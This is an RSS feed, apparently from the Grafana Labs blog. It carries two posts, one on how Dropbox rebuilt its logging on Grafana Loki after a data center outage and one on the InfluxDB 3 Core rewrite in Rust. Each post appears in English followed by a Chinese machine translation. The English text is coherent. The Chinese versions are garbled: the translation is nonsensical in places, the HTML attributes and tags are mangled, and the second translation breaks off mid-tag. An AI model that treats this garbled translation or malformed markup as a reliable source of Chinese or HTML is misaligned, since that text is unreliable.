<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Grafana Labs blog on Grafana Labs</title>
    <link>/blog/index.xml</link>
    <description>Recent content in Grafana Labs blog on Grafana Labs</description>
    <item>
      <title>【How Dropbox rebuilt its logging stack with Grafana Loki after a data center went dark】数据中心变黑后，Dropbox如何与Grafana Loki重建其伐木堆栈</title>
      <link>https://grafana.com/blog/2025/06/27/how-dropbox-rebuilt-its-logging-stack-with-grafana-loki-after-a-data-center-went-dark/</link>
      <description>【&lt;p&gt;Two years ago, a power outage knocked a Dropbox data center offline.&lt;/p&gt;&#xA;&lt;p&gt;It wasn’t just any data center. It was the only one where Dropbox hosted&#xA;&lt;a href=&#34;/oss/loki/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Loki&lt;/a&gt;, meaning engineers couldn’t access their log data.&lt;/p&gt;&#xA;&lt;p&gt;“We had considered a data center outage when we were rolling out Loki, but it had just never risen up in priority enough to get put into multiple data centers,” said Chris Hodges, an infrastructure software engineer at the cloud storage company. “And now we were paying the price.”&lt;/p&gt;&#xA;&lt;p&gt;The incident became an inflection point for Dropbox, which evolved that single distributed Loki cluster into a reliable petabyte-scale logging platform—all while balancing developer needs and operational realities. As a result, Dropbox is now able to ingest up to 6 GB of logs per second, with as much as 5 PB in storage at any given time as part of their expanded 30-day retention policy.&lt;/p&gt;&#xA;&lt;p&gt;“It was a good learning experience for us,” said Hodges, who discussed that journey and shared strategies for operationalizing Loki at scale during his&#xA;&lt;a href=&#34;/events/grafanacon/2025/loki-at-dropbox-logging-at-petabyte-scale/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;GrafanaCON 2025 talk&lt;/a&gt; last month. “I wish we&amp;rsquo;d been better prepared for it, but it really gave us an idea of what we needed to do to make this better in the future.”&lt;/p&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cqHO0oYW6Ic?si=XimqMfLBfrI%3frel%3d0&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;h2 id=&#34;a-single-place-for-observability&#34;&gt;‘A single place for observability’&lt;/h2&gt;&#xA;&lt;p&gt;Dropbox originally selected Loki for multi-tenant log aggregation during its migration to Kubernetes. Developers had previously relied on manual, host-by-host logging methods like SSH and VI, or transferring files off hosts. That wasn’t going to scale with Kubernetes, where logs—especially pod logs, which are deleted when pods are rescheduled—are much more ephemeral.&lt;/p&gt;&#xA;&lt;p&gt;Loki is based on object storage, so it offered a more persistent solution. Price, multi-tenancy support, privacy controls, and reliability were additional selling points, as was Dropbox’s longtime use of Grafana Labs&amp;rsquo; projects and products in other areas.&lt;/p&gt;&#xA;&lt;p&gt;“We definitely wanted to have a single place for observability: logs, metrics, and traces,” Hodges said. “And Grafana just seemed like it was going to continue to be the best solution for that.”&lt;/p&gt;&#xA;&lt;h2 id=&#34;planning-and-design&#34;&gt;Planning and design &lt;/h2&gt;&#xA;&lt;p&gt;The outage made it clear that Loki needed to be in multiple regions to ensure its availability, even in the event of a complete data center failure. Dropbox developed a failover strategy where DNS would redirect the log shipping agent Promtail to Loki, so logs to be sent to a different region in case of disaster.&lt;/p&gt;&#xA;&lt;p&gt;The system also used a shared object storage layer across regions, with Amazon S3 offering availability zone redundancy and Dropbox’s&#xA;&lt;a href=&#34;https://www.infoq.com/articles/dropbox-magic-pocket-exabyte-storage/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Magic Pocket&lt;/a&gt; providing on-premises, cross-region storage replication. This combination eliminated the need for duplicate logs, which would have been cost-prohibitive at petabyte scale.&lt;/p&gt;&#xA;&lt;p&gt;Dropbox designed a playbook for simulating this failover without disrupting users. During these tests, Hodges and team discovered that logs buffered in memory didn’t immediately flush to storage, creating the potential for data loss. Engineers manually triggered a flush, but that caused a disruptive torrent of writes. The experience reinforced the importance of cross-team coordination, rate-limiting safeguards. and testing before deployment.&lt;/p&gt;&#xA;&lt;p&gt;“I&amp;rsquo;d rather the first time we run this not be when a data center is down,” Hodges said.&lt;/p&gt;&#xA;&lt;h2 id=&#34;a-gradual-rollout&#34;&gt;A gradual rollout&lt;/h2&gt;&#xA;&lt;p&gt;From there, Dropbox took a measured approach to deploying Loki more widely. Promtail gradually rolled out to 10,000 to 20,000 hosts at a time as the team watched for ingestion and disk usage spikes.&lt;/p&gt;&#xA;&lt;p&gt;One problem that emerged was high cardinality. Each log line included a set of labels, such as the service name and host, that formed a unique identifier. But too many label combinations on a host threatened to clog the ingestion pipeline and cause out-of-memory crashes. Dropbox addressed this issue by imposing tight controls and standardization on its label schema.&lt;/p&gt;&#xA;&lt;p&gt;Strict limits—including seven-day retention, six-hour query windows and both global and per-stream rate caps—further helped maintain stability as adoption increased. Still, some services generated so many logs that they risked overwhelming the system. Dropbox isolated these workloads using stream-level controls and exponential backoff in Promtail. Additionally, custom pull requests allowed one service to be heavily throttled while others could continue sending logs, which solved the problem of head-of-line blocking.&lt;/p&gt;&#xA;&lt;p&gt;“A core tenet of multi-tenancy is that one badly behaving tenant doesn’t ruin the experience for everybody,” Hodges said. “This was an issue that very nearly kept us from rolling out Loki to production.”&lt;/p&gt;&#xA;&lt;h2 id=&#34;a-trusted-system&#34;&gt;A trusted system&lt;/h2&gt;&#xA;&lt;p&gt;As the system proved itself, Dropbox relaxed some restrictions, such as by increasing retention to 30 days. The company also worked with Grafana Labs to switch its back end from BoltDB to a Prometheus-style time series database.&lt;/p&gt;&#xA;&lt;p&gt;“They saved our bacon,” Hodges said. “We saw an order of magnitude improvement in our performance on label queries.”&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 2498px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/dropbox-loki/loki-adoption-over-time.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/dropbox-loki/loki-adoption-over-time.png&#34;data-srcset=&#34;/media/blog/dropbox-loki/loki-adoption-over-time.png?w=320 320w, /media/blog/dropbox-loki/loki-adoption-over-time.png?w=550 550w, /media/blog/dropbox-loki/loki-adoption-over-time.png?w=750 750w, /media/blog/dropbox-loki/loki-adoption-over-time.png?w=900 900w, /media/blog/dropbox-loki/loki-adoption-over-time.png?w=1040 1040w, /media/blog/dropbox-loki/loki-adoption-over-time.png?w=1240 1240w, /media/blog/dropbox-loki/loki-adoption-over-time.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A Grafana dashboard shows how Dropbox has grown its log igestion rate over time&#34;width=&#34;2498&#34;height=&#34;1408&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/dropbox-loki/loki-adoption-over-time.png&#34;&#xA;alt=&#34;A Grafana dashboard shows how Dropbox has grown its log igestion rate over time&#34;width=&#34;2498&#34;height=&#34;1408&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;Today, Loki has become a trusted system across the entire company—so much so that Dropbox shut down its legacy logging system. Its shared storage and DNS-based region switching enable fast failover for high availability. And it operates at a massive scale as a core part of Dropbox’s observability stack. It now ingests 5 GB to 6 GB of logs per second, with 30-day retention totaling 4 PB to 5 PB at any given time.&lt;/p&gt;&#xA;&lt;p&gt;That steady growth—from a single-region cluster to a resilient platform—is one of the main reasons why &amp;ldquo;we&amp;rsquo;re excited for what&amp;rsquo;s coming forward with Loki,&amp;rdquo; Hodges said.&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt; Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt;两年前，一次停电使Dropbox Data Center Offline敲开了Dropbox数据中心。&lt;/p&gt;&#xA;&lt;p&gt;不仅是任何数据中心。这是唯一一个托管的人&#xA;&lt;a href =“/oss/loki/？pg = blog＆plcmt = body-txt”&gt; grafana loki &lt;/a&gt;，这意味着工程师无法访问其日志数据。&lt;/p&gt;&#xA;&lt;p&gt;“当我们推出Loki时，我们已经考虑了数据中心的中断，但它从未优先提高以至于将其放入多个数据中心。 “现在我们要付出代价。” &lt;/p&gt;&#xA;&lt;p&gt;该事件成为Dropbox的一个拐点，该凸箱将单个分布式的Loki群集演变为可靠的PB尺度记录平台，所有这些都在平衡开发人员的需求和操作现实的同时。结果，Dropbox现在能够每秒摄入多达6 GB的日志，在任何给定时间存储多达5 pb，作为其扩展的30天保留政策的一部分。&lt;/p&gt;&#xA;&lt;p&gt;“这对我们来说是一次很好的学习经历，”霍奇斯说，他讨论了这一旅程和分享的策略，以便在他的过程中大规模运营Loki&#xA;&lt;a href =“/events/grafanacon/2025/loki-at-at-dropbox-logging-at-at-at-petabyte-cale/？pg = blog＆plcmt = body-txt = body-txt”&gt; grafanacon 2025 2025 Talk &lt;/a&gt;上个月。 “我希望我们能为此做好准备，但这确实使我们了解了将来需要做些什么才能使情况变得更好。” &lt;/p&gt;&#xA;&lt;iframe width =“ 560” height =“ 315” src =“ https://www.youtube.com/embed/cqho0oyw6ic?si = ximqmflbfri%3frel%3d0”陀螺仪;&#xA;在&#xA;&lt;p&gt; Dropbox最初选择的LOKI用于多租户日志聚合，以便在其迁移到Kubernetes期间。开发人员以前曾依靠手册，宿主记录方法（如SSH和VI），或者从主机上转移文件。这不会随着Kubernetes的规模扩展，该日志（尤其是在重新安排豆荚时被删除的吊舱日志），这是更短暂的。&lt;/p&gt;&#xA;&lt;p&gt; loki基于对象存储，因此它提供了更持久的解决方案。价格，多租户支持，隐私控制和可靠性是其他卖点，Dropbox长期使用Grafana Labs的项目和其他领域的产品。&lt;/p&gt;&#xA;&lt;p&gt;“我们绝对想拥有一个可观察性的地方：日志，指标和痕迹，”霍奇斯说。 “而且格拉法纳似乎将继续成为最好的解决方案。” &lt;/p&gt;&#xA;&lt;H2 ID =“计划和设计”&gt;计划和设计&lt;/h2&gt;&#xA;&lt;p&gt;中断明确表明，即使在完全数据中心故障的情况下，Loki也需要在多个区域内确保其可用性。 Dropbox制定了故障转移策略，DNS将重定向日志运输代理舞会到Loki的尾巴，因此在发生灾难的情况下，日志将被发送到另一个地区。&lt;/p&gt;&#xA;&lt;p&gt;该系统还使用了跨区域的共享对象存储层，Amazon S3提供可用性区域冗余和Dropbox的&#xA;&lt;a href =“ https://www.infoq.com/articles/dropbox-magic-pocket-exabyte-storage/” target =“ _ black” rel =“ noopener noreferrer”&gt;魔术口袋&lt;/a&gt;提供本地跨区域存储复制。这种组合消除了对重复日志的需求，这在PB尺度上会过于良好。&lt;/p&gt; &lt;/p&gt;&#xA;&lt;p&gt; Dropbox设计了一本剧本，用于模拟此故障转移而不会破坏用户。在这些测试中，霍奇斯和团队发现，在内存中缓冲的日志并没有立即冲洗到存储，从而产生了数据丢失的可能性。工程师手动触发了冲洗，但这引起了颠覆性的写作。这种经验加强了跨阵容协调，限制速率保障措施的重要性。和部署前的测试。&lt;/p&gt;&#xA;&lt;p&gt;“我宁愿我们第一次运行的不是数据中心掉落的时候。” &lt;/p&gt;&#xA;&lt;h2 id =“ a gradual-rollout”&gt;逐渐推出&lt;/h2&gt;&#xA;&lt;p&gt;从那里，Dropbox采用了一种测量的方法来更广泛地部署Loki。当团队观看摄入和磁盘用法尖峰时&#xA;&lt;p&gt;出现的一个问题是高铁。每个日志行都包含一组构成唯一标识符的标签，例如服务名称和主机。但是，寄主的标签组合太多，可能会堵塞摄入管道并导致过度的撞车事故。 Dropbox通过在其标签架构上实施严格的控制和标准化来解决此问题。&lt;/p&gt;&#xA;&lt;p&gt;严格的限制 - 包括7天的保留，六小时的查询窗口以及全球和每次流率上限 - 随着采用率的增加而有助于保持稳定性。尽管如此，某些服务仍产生了如此多的日志，以至于他们冒着压倒系统的风险。 Dropbox使用流级控件和Promtail中的指数向后隔离了这些工作负载。此外，自定义拉的请求允许一项服务大量节流，而其他服务可以继续发送日志，这解决了线条阻止的问题。&lt;/p&gt;&#xA;&lt;p&gt;“多租户的核心宗旨是，一个表现不佳的房客不会破坏所有人的经验，”霍奇斯说。 “这是一个几乎使我们无法将Loki推出到生产的问题。” &lt;/p&gt;&#xA;&lt;H2 ID =“ A-Trusted-System”&gt;一个受信任的系统&lt;/h2&gt;&#xA;&lt;p&gt;正如系统证明自己的那样，Dropbox放宽了一些限制，例如将保留率提高到30天。该公司还与Grafana Labs合作，将其后端从Boltdb切换为Prometheus风格的时间序列数据库。&lt;/p&gt;&#xA;&lt;p&gt;“他们拯救了我们的培根，”霍奇斯说。 “我们在标签查询上的性能有所改善。” &lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：2498px;”&#xA;itemprop =“ associDEDMedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/dropbox-loki/loki-adoption-over time.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/dropbox-loki/loki-adoption-over time.png” data-srcset =“/媒体/blog/drogbox loki/loki-adoption-option-overtie.png？ /media/blog/dropbox-loki/loki-adoption-over time.png?w=750 750w，/media/blog/dropbox-loki/loki-adoption-odoption-option-over-pime.png?w=900 900w，/mredia/media/media/blog/dropbox-loki/loki/loki/loki/loki/loki/loki-adoption-perim.pn-0400404040404040404040404040404040404040404 /Media/blog/dropbox-loki/loki-adoption-over time.png?w=1240 1240W，/media/blog/dropbox-loki/loki-adoption-option-over-pite.png?w=19201920w&#39;&#xA;data-sizes =“ auto” alt =“一个grafana仪表板显示了dropbox如何随时间增长其日志igestion率。&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/dropbox-loki/loki-adoption-over time.png”&#xA;alt =“ grafana仪表板显示了Dropbox如何随时间增长其日志igestion率。宽度=“ 2498”高=“ 1408”&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;今天，Loki已成为整个公司的一个值得信赖的系统 - 因此，Dropbox关闭了其传统记录系统。它的共享存储和基于DNS的区域切换可实现快速故障转移，以获得高可用性。它是Dropbox可观察性堆栈的核心部分的大规模运行。现在，它可以每秒摄入5 GB至6 GB的日志，在任何给定时间，保留总计为4 pb至5 pb。&lt;/p&gt; &lt;/p&gt;&#xA;&lt;p&gt;稳定的增长（从单一区域集群到弹性平台）是“我们为Loki的进展感到兴奋的主要原因之一，”霍奇斯说。&lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“//auth/ign-up/create-user/？pg = blog＆plcmt = body-txt”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Fri, 27 Jun 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【InfluxDB 3 Core: a complete rewrite designed for speed and simplicity】infuxdb 3核心：专为速度和简单性而设计的完整改写</title>
      <link>https://grafana.com/blog/2025/07/03/influxdb-3-core-a-complete-rewrite-designed-for-speed-and-simplicity/</link>
      <description>【&lt;p&gt;InfluxDB has been a popular time series database for the better part of a decade, and the latest release represents years of work behind the scenes to address several major feature requests users have been asking for since the earliest days of the time series database.&lt;/p&gt;&#xA;&lt;p&gt;Paul Dix, Co-founder and CTO of InfluxData,&#xA;&lt;a href=&#34;/events/grafanacon/2025/influxdb-3-core-open-source-release/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;spoke at GrafanaCON 2025&lt;/a&gt; about the recent release of InfluxDB 3 Core, the open source version of InfluxDB, which he described as the &amp;ldquo;culmination of a four and a half year journey of rebuilding InfluxDB.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;&#xA;&lt;a href=&#34;https://www.influxdata.com/products/influxdb-core/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;InfluxDB 3 Core&lt;/a&gt; is designed for simplicity and speed, Dix said, with new features for unlimited cardinality, SQL support, and the separation of compute and storage.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;We designed it from the ground up to be something that you could just have on your laptop in a few seconds or on a server,&amp;rdquo; Dix said. &amp;ldquo;It’s easy to get going. It’s a one-command-line install, native SQL, and InfluxQL out of the box.&amp;rdquo;&lt;/p&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cqHO0oYW6Ic?si=mKu1PIhl2Ms%3frel%3d0&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;h2 id=&#34;what-is-influxdb&#34;&gt;What is InfluxDB? &lt;/h2&gt;&#xA;&lt;p&gt;For those who aren&amp;rsquo;t familiar, InfluxDB is a time series database for metrics and events that can then be visualized in dashboards such as&#xA;&lt;a href=&#34;/oss/grafana/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana&lt;/a&gt;. It&amp;rsquo;s largely used on data that&amp;rsquo;s less than 24 hours old, and its designed to be highly performant for ingestion and querying. Use cases are geared toward server network monitoring, application performance, and sensor data of all kinds—from factories, powerplants, mining, water and waste, rockets, agriculture, satellites, vehicles, and more.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1999px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/influxdb-gcon-25/influxdb-architecture.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/influxdb-gcon-25/influxdb-architecture.png&#34;data-srcset=&#34;/media/blog/influxdb-gcon-25/influxdb-architecture.png?w=320 320w, /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=550 550w, /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=750 750w, /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=900 900w, /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=1040 1040w, /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=1240 1240w, /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;InfluxDB 3 data model diagram&#34;width=&#34;1999&#34;height=&#34;1115&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/influxdb-gcon-25/influxdb-architecture.png&#34;&#xA;alt=&#34;InfluxDB 3 data model diagram&#34;width=&#34;1999&#34;height=&#34;1115&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;InfluxDB differs from other pure metrics databases because of the number of column types it supports, as well as its ability to do schema-on-write, Dix added.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;When you start up the database, you don’t have to create a database, you don’t have to create tables or anything like that. You start up the server, you start throwing data at it and it will create the logical database on the fly,&amp;rdquo; he said. &amp;ldquo;It will create the tables and create the columns. But once you’ve defined that, subsequent requests will validate against the schema that you’ve created.&amp;rdquo;&lt;/p&gt;&#xA;&lt;h2 id=&#34;influxdb-3-core-a-rewrite-to-solve-user-challenges&#34;&gt;InfluxDB 3 Core: a rewrite to solve user challenges&lt;/h2&gt;&#xA;&lt;p&gt;The initial InfluxDB 3 release happened in 2023 with a hosted version, and the open source version (Core) was released this past April, completing a rewrite from Go to Rust.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;The question everybody has…is why do a big rewrite?&amp;rdquo; Dix said &amp;ldquo;And the truth is, we wanted to solve three big problems in the database that many, many people were asking us to solve.&amp;rdquo;&lt;/p&gt;&#xA;&lt;h3 id=&#34;unlimited-cardinality&#34;&gt;Unlimited cardinality&lt;/h3&gt;&#xA;&lt;p&gt;The first big problem they wanted to address was making sure high cardinality was no longer a blocker for users. People don&amp;rsquo;t want to have to think about the cardinality of the data they write to the database, Dix said. Metadata, which describes the time series, drives cardinality, but it also gives you greater precision with your observability. So they designed InfluxDB 3 to handle high cardinality without sacrificing on performance.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;If you want the ultimate precision, you’re going to have more of these dimensions, they’re going to be more unique values, and you’re going to have greater and greater cardinality in your observational data,&amp;rdquo; Dix said. &amp;ldquo;And we wanted a backend, a storage engine that would be able to handle this without driving up costs and being totally difficult to manage.&amp;rdquo;&lt;/p&gt;&#xA;&lt;h3 id=&#34;sql-support&#34;&gt;SQL support&lt;/h3&gt;&#xA;&lt;p&gt;The next big change was adding SQL support. InfluxDB already had InfluxQL, which was similar but didn&amp;rsquo;t have full feature compatibility. &amp;ldquo;For people who are really familiar with SQL, it was different in sometimes frustrating ways.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;So InfluxDB 3 comes with native support for InfluxQL and SQL, making it easier for developers and data scientists to get started regardless of their experience with InfluxDB.&lt;/p&gt;&#xA;&lt;h3 id=&#34;object-storage&#34;&gt;Object storage&lt;/h3&gt;&#xA;&lt;p&gt;Finally, InfluxDB 3 Core separates compute from storage. In previous versions, users had to have a locally attached SSD, which is OK for recent data, but not for longer-term data retention.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;People wanted to have the historical data available for query, but they didn’t want to pay for it on the most expensive storage medium available. They wanted to use object store,&amp;rdquo; Dix said.&lt;/p&gt;&#xA;&lt;p&gt;To address this, they build a &amp;ldquo;diskless architecture&amp;rdquo; where you can specify the file system as the object store, which gives you multi-availability-zone durability at very little cost.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;One of the great things is we end up having stateless servers,&amp;rdquo; Dix said. &amp;ldquo;Now obviously the servers load up a bunch of state in RAM, but ultimately they’re stateless because you can boot up a new VM and just load all the state from object store. And this makes it operationally simple.&amp;rdquo;&lt;/p&gt;&#xA;&lt;h2 id=&#34;learn-more-about-influxdb-3-core&#34;&gt;Learn more about InfluxDB 3 Core&lt;/h2&gt;&#xA;&lt;p&gt;Ultimately, Dix said, InfluxDB 3 Core is built for simplicity and speed, with a one-command install, optimization for recent data queries, and an embedded Python processing engine, which is a big opportunity for engineers to push down advanced processing directly into the database.&lt;/p&gt;&#xA;&lt;p&gt;To learn more about how a range of new features support this functionality—as well as some important info on limitations—check out the&#xA;&lt;a href=&#34;/events/grafanacon/2025/influxdb-3-core-open-source-release/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;video from GrafanaCON 2025&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt; Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt; InfluxDB在十年的大部分时间里一直是流行的时间序列数据库，最新版本代表了幕后的多年工作，以解决用户自时时间序列数据库的最早时间以来一直要求的几个主要功能请求。&lt;/p&gt; &lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt; Paul Dix，Infuxdata的联合创始人和CTO，&#xA;&lt;a href=&#34;/events/grafanacon/2025/influxdb-3-core-open-source-release/?pg=blog&amp;plcmt=body-txt&#34;&gt;spoke at GrafanaCON 2025&lt;/a&gt; about the recent release of InfluxDB 3 Core, the open source version of InfluxDB, which he described as the “culmination of a four and a half year journey of rebuilding infuxdb。” &lt;/p&gt;&#xA;&lt;p&gt;&#xA;&lt;a href =“ https://www.influxdata.com/products/influxdb-core/” target =“ _ blank” rel =“ noopener noreferrer”&gt; inder in offuxdb 3 core &lt;/a&gt; &lt;/a&gt;是为简单和速度而设计的。&#xA;&lt;p&gt;“我们从头开始将其设计为您可以在几秒钟内或服务器上只能在笔记本电脑上使用的东西，” Dix说。 “它很容易开始。这是一个单行的安装，本机SQL和InfluxQl开箱即用。” &lt;/p&gt;&#xA;&lt;iframe width =“ 560” height =“ 315”陀螺仪;&#xA;&lt;h2 id =“什么是influxdb”&gt;什么是infuxdb？ &lt;/h2&gt;&#xA;&lt;p&gt;对于那些不熟悉的人，InfluxDB是一个时间序列数据库，用于指标和事件，然后可以在仪表板中可视化，例如&#xA;&lt;a href =“/oss/grafana/？pg = blog＆plcmt = body-txt”&gt; grafana &lt;/a&gt;。它主要用于少于24小时的数据，其设计为摄入和查询的高性能。用例旨在用于服务器网络监控，应用程序性能和各种传感器数据，包括工厂，动力装置，采矿，水和废物，火箭，农业，卫星，车辆等。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1999px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/infuxdb-gcon-25/influxdb-architecture.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/infuxdb-gcon-25/infuxdb-architecture.png” data-srcset =“/媒体/blog/infuluxdb-gcon-25/influxdb-architection.png = w = 320 320w，/media/media/media/blog/blog/blog/influxdb-gcon-25/influxdb-archituct-ginfn = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = /media/blog/influxdb-gcon-25/influxdb-architecture.png?w=750 750W，/media/Blog/influxdb-gcon-25/influxdb-architector.png？ 1040W，/media/blog/influxdb-gcon-25/influxdb-architecture.png?w=1240 1240w，/媒体/blog/blog/forfuxdb-gcon-25/infuxdb-architecture.png？w = 1920年1920年&#xA;data-sizes =“ auto” alt =“ infuxdb 3数据模型图” width =“ 1999”高度=“ 1115”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/infuxdb-gcon-25/influxdb-architecture.png”&#xA;alt =“ influxdb 3数据模型图” width =“ 1999”高度=“ 1115”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt; infuxdb与其他纯指标数据库不同，因为它支持的列类型的数量以及其在写作上的模式的能力。&lt;/p&gt; &lt;/p&gt;&#xA;&lt;p&gt;“当您启动数据库时，您不必创建数据库，不必创建表格或类似的内容。您启动服务器，您开始向其扔数据，它将即时创建逻辑数据库。”他说。 “它将创建表并创建列。但是，一旦定义了这一点，随后的请求将对您创建的模式进行验证。” &lt;/p&gt;&#xA;&lt;h2 id =“ influxdb-3核-A-螺旋 - 螺旋 - 链条 - 用户 - 挑战”&gt; influxdb 3核心：解决用户挑战的重写&lt;/h2&gt;&#xA;&lt;p&gt;最初的InfluxDB 3版本发生在2023年，带有托管版本，开源版本（Core）于今年4月发布，完成了从Go Rust的重写。&lt;/p&gt;&#xA;&lt;p&gt;“每个人都有的问题……为什么要重写？”迪克斯说：“事实是，我们想解决许多许多人要求我们解决的数据库中的三个大问题。” &lt;/p&gt;&#xA;&lt;H3 ID =“ Unlimited-Cardinality”&gt;无限的基数&lt;/h3&gt;&#xA;&lt;p&gt;他们想解决的第一个大问题是确保高基数不再是用户的阻滞剂。迪克斯说，人们不想考虑写入数据库的数据的基础性。描述时间序列的元数据驱动了基数，但它还可以使您的观察力更加精确。因此，他们设计了InfluxDB 3来处理高基数而不牺牲性能。&lt;/p&gt;&#xA;&lt;p&gt;“如果您想要最终的精度，那么您将拥有更多这些维度，它们将是更独特的价值，并且在观察数据中将具有越来越多的基础性，” Dix说。 “而且我们想要一个后端，这是一种能够在不增加成本和完全难以管理的情况下处理此操作的存储引擎。” &lt;/p&gt;&#xA;&lt;H3 ID =“ 